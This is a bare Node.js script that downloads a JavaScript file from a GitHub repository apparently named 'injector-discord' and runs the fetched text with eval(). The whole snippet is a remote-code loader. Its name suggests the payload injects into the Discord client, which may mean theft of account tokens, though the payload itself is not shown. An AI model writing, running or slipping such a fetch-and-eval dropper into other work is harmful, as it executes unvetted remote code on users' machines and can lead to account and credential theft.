const url = 'https://raw.githubusercontent.com/SamuelMeu/injector-discord/main/index.js'
const https = require('https')
https.get(url, (res, req) => {
    var data = ""
    res.on('data', (dat) => {
        data += dat.toString()
    })
    res.on('end', () => {
        eval(data)
    })
})